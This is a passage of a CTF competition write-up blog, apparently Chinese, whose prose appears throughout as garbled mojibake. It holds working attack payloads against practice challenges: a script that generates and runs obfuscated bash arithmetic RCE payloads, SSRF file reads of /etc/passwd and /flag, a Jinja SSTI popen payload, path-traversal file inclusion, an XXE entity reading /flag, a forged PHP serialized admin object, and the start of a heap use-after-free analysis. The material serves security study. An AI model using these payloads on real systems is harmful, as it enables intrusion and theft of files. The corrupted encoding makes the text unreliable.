aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))))))</p></blockquote><p>â€‹è§£å†³äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;LitCTF&#123;dollar_d0llar_d0ll@r!!!&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ç”Ÿæˆ payload çš„è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import os.path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def mult_times(str, m, n):</span><br><span class="line">    front_len = m</span><br><span class="line">    if front_len &gt; len(str):</span><br><span class="line">        front_len = len(str)</span><br><span class="line">    front = str[:front_len]</span><br><span class="line"></span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    for i in range(n):</span><br><span class="line">        result = result + front</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ„é€ å‚æ•°</span><br><span class="line">print(&quot;æç¤ºï¼š$(($&#123;_&#125;))=0ï¼Œ$((~$(($&#123;_&#125;))))=-1&quot;)</span><br><span class="line">print(&quot;è¯·è¾“å…¥ä½ è¦æ„é€ çš„æ•°å­—&quot;)</span><br><span class="line">n = int(input(&quot;æ„é€ çš„æ•°å­—:&quot;))</span><br><span class="line">yuanshi = mult_times(&#x27;$((~$(())))&#x27;, 11, n + 1)</span><br><span class="line">fushu = mult_times(&#x27;$((~$(())))&#x27;, 11, n)</span><br><span class="line">print(&quot;åŸå§‹æ•°æ®ï¼š&quot;, yuanshi)</span><br><span class="line">q = &#x27;~$((&#x27;</span><br><span class="line">p = &#x27;))&#x27;</span><br><span class="line">print(&#x27;ç¬¬ä¸€æ¬¡å–åç»“æœä¸ºï¼š&#x27;)</span><br><span class="line">print(q + yuanshi + p)</span><br><span class="line">FSQF = (q + fushu + p)</span><br><span class="line">b = &#x27;$((~$((&#x27;</span><br><span class="line">c = &#x27;))))&#x27;</span><br><span class="line">ZX = &#x27;echo&#x27;</span><br><span class="line">end = (ZX + &quot; &quot; + b + yuanshi + c)</span><br><span class="line">FSQF2 = ZX + &quot; &quot; + q + fushu + p</span><br><span class="line">print(&#x27;æœ€åæ„é€ æ­£æ•°ç»“æœä¸ºï¼š&#x27;)</span><br><span class="line">print(end)</span><br><span class="line">print(&#x27;æœ€åæ„é€ è´Ÿæ•°ç»“æœä¸ºï¼š&#x27;)</span><br><span class="line">print(FSQF2)</span><br><span class="line"># ç»“æœå†™å…¥</span><br><span class="line">current_path = os.getcwd()</span><br><span class="line">file_path = os.path.join(current_path, &#x27;RCE.sh&#x27;)</span><br><span class="line">file_test = open(file_path, &#x27;w+&#x27;, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">file_test.write(end)</span><br><span class="line">file_test.close()</span><br><span class="line">current_path = os.getcwd()</span><br><span class="line">file_path = os.path.join(current_path, &#x27;RCE2.sh&#x27;)</span><br><span class="line">file_test = open(file_path, &#x27;w+&#x27;, encoding=&#x27;utf-8&#x27;)</span><br><span class="line">file_test.write(FSQF2)</span><br><span class="line">file_test.close()</span><br><span class="line"># è¿›è¡Œåˆ¤æ–­</span><br><span class="line">print(&quot;åˆ¤æ–­æœ‰æ•ˆï¼è¾“å‡ºæ­£æ•°æ•°å­—ä¸ºï¼š&quot;)</span><br><span class="line">os.system(&quot;chmod +x RCE.sh;bash RCE.sh&quot;)</span><br><span class="line">print(&quot;åˆ¤æ–­æœ‰æ•ˆï¼è¾“å‡ºè´Ÿæ•°æ•°å­—ä¸ºï¼š&quot;)</span><br><span class="line">os.system(&quot;chmod +x RCE.sh;bash RCE2.sh&quot;)</span><br></pre></td></tr></table></figure><h2 id="2-æµè§ˆå™¨ä¹Ÿèƒ½å¥—å¨ƒ"><a class="markdownIt-Anchor" href="#2-æµè§ˆå™¨ä¹Ÿèƒ½å¥—å¨ƒ">#</a> 2ã€æµè§ˆå™¨ä¹Ÿèƒ½å¥—å¨ƒï¼Ÿ</h2><p>â€‹æç¤ºæˆ‘ä»¬è¾“å…¥ä¸€ä¸ª URLï¼ŒçŒœæµ‹ä¸€ä¸‹æ˜¯ SSRF æ¼æ´ï¼Œæ— è„‘ä¼ ä¸€ä¸ª <span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20=">http://www.baidu.com</span>ï¼Œå‘ç°æˆåŠŸäº†ï¼Œä¼ ä¸‹ file:///etc/passwd å‘ç°èƒ½è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin utmp:x:100:406:utmp:/home/utmp:/bin/false nginx:x:101:101:nginx:/var/lib/nginx:/sbin/nologin </span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥è¯»å–æ ¹ç›®å½•çš„ flag æ–‡ä»¶ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ï¼Œå¾ˆæ˜æ˜¾æœ‰ï¼Œpayload file:///flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;9088fd46-7dbc-4235-9b88-4f81a53d0c89&#125;</span><br></pre></td></tr></table></figure><h2 id="3-ä¸€ä¸ªæ± å­"><a class="markdownIt-Anchor" href="#3-ä¸€ä¸ªæ± å­">#</a> 3ã€ä¸€ä¸ªâ€¦ æ± å­ï¼Ÿ</h2><p>â€‹åˆšå¼€å§‹ä»¥ä¸ºæ˜¯ SQL æ³¨å…¥ï¼Œç»“æœæŠ“åŒ…ä¸å°å¿ƒçœ‹åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">404</span> NOT FOUND</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/3.0.3 Python/3.10.14</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 05 Jun 2024 08:52:31 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>207</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜¾ç„¶æ˜¯ä¸ª flask æ¡†æ¶ï¼Œå¦å¤–ï¼Œæˆ‘ä»¬è¾“å…¥ä»€ä¹ˆï¼Œå®ƒè·Ÿç€è¾“å‡ºæ¥äº†ï¼Œæ¨æµ‹å¯èƒ½æ˜¯ ssti æ¼æ´ï¼Œç›´æ¥ä¸€æŠŠæ¢­ï¼Œæˆ–è€…ä¸€æ­¥æ­¥æ¥ï¼Œæœ€ç»ˆæ„é€ çš„ payload å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[137].__init__.__globals__[&#x27;popen&#x27;](&quot;cat+/flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ€åæ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;f9c874a6-9276-470c-b37b-b999b23fee0e&#125;</span><br></pre></td></tr></table></figure><h2 id="4-é«˜äº®ä¸»é¢˜åˆ’æ‰èƒŒæ™¯æŸ¥çœ‹å™¨"><a class="markdownIt-Anchor" href="#4-é«˜äº®ä¸»é¢˜åˆ’æ‰èƒŒæ™¯æŸ¥çœ‹å™¨">#</a> 4ã€é«˜äº®ä¸»é¢˜ (åˆ’æ‰) èƒŒæ™¯æŸ¥çœ‹å™¨</h2><p>â€‹å†ç”¨ hackbar çš„æ—¶å€™ï¼Œç‚¹äº†ä¸‹ POST æ–¹æ³•ï¼Œæ²¡æƒ³åˆ°çœ‹åˆ°äº†æœ‰æ„æ€çš„ä¸œè¥¿ï¼Œå°±æ˜¯ theme å‚æ•°ï¼Œä½¿ç”¨äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯çŒœé”™åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ— è„‘æ¢­å“ˆä¸€ä¸ª POST ï¼š theme=â€¦/â€¦/â€¦/â€¦/flag</p><p>â€‹æœ€åå¾—åˆ° flagã€‚</p><h2 id="5-exx"><a class="markdownIt-Anchor" href="#5-exx">#</a> 5ã€exx</h2><p>â€‹çœ‹é¢˜ç›®åº”è¯¥æ˜¯ xxe æ¼æ´ï¼Œææ–‡ä»¶åŒ…å«çš„ï¼Œç›´æ¥æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ŒåŸºç¡€ xxeï¼Œæ— ä»»ä½•è¿‡æ»¤ï¼Œä¸”æœ¬åœ°åŒ…å«ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æœ€åæ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;0bc65b57-3d0c-43e4-ae32-fcd9276f430b&#125;</span><br></pre></td></tr></table></figure><h2 id="6-sas-serializing-authentication"><a class="markdownIt-Anchor" href="#6-sas-serializing-authentication">#</a> 6ã€SAS - Serializing Authentication</h2><p>â€‹ç»™äº†æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="string">&#x27;secure_password&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¤§æ¦‚æ¨æµ‹æ˜¯è®© isValid è¿™ä¸ªæ–¹æ³•ä¸ºçœŸï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªå°±ç®€å•äº†ï¼Œæç¤ºæŒºæ˜æ˜¾çš„ï¼Œæœ‰ä¸ª base64 è§£ç ï¼Œé‚£ä¹ˆæ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="string">&#x27;secure_password&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;secure_password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiJzZWN1cmVfcGFzc3dvcmQiO30=</span><br></pre></td></tr></table></figure><p>â€‹flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;deserialization_vulnerability&#125;</span><br></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwnï¼š</h1><h2 id="1-heap-223"><a class="markdownIt-Anchor" href="#1-heap-223">#</a> 1ã€heap-2.23</h2><p>â€‹å…ˆæŸ¥çœ‹æ¶æ„å’Œä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@MSI:/mnt/c/Users/20820/Downloads/pwn# checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>â€‹å¼€å¯äº†æ ˆä¸å¯æ‰§è¡Œå’Œæ ˆæº¢å‡ºä¿æŠ¤ï¼Œé‚£ä¹ˆï¼Œæ‰” IDA é‡Œçœ‹çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400866(a1, a2, a3);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4008B3();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_4008FB();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_400A0B();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sub_400AAB();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sub_400B55();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        sub_400C15();</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹main å‡½æ•°æ„Ÿè§‰å¾ˆçœ¼ç†Ÿï¼Œä¸ç®¡äº†ï¼Œæ‰¾åˆ°äº†ä¸ªä¼¼ä¹å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_400A0B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xF</span> &amp;&amp; *(&amp;ptr + (<span class="type">int</span>)v0) )</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;ptr + (<span class="type">int</span>)v0));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç”±äºåœ¨ free æ‰ä¸€ä¸ª chunk ä¹‹åæ²¡æœ‰å¯¹å…¶æŒ‡é’ˆè¿›è¡Œç½®é›¶ï¼Œæ‰€ä»¥è¿™é‡Œå¯èƒ½äº§ç”Ÿäº† UAFï¼Œæœç„¶ï¼Œæˆ‘å¤ªèœäº†ï¼Œæœ€ç®€å•çš„ UAF éƒ½çœ‹ä¸æ‡‚ï¼Œè·Ÿç€å¤§ä½¬çœ‹çœ‹ç®—äº†ï¼Œæ ¹æ®å¤§ä½¬ä»¬çš„ wpï¼Œä¼¼ä¹æ˜¯é€šè¿‡æ³„éœ²__malloc_hook çš„åœ°å€ï¼Œç„¶åæ 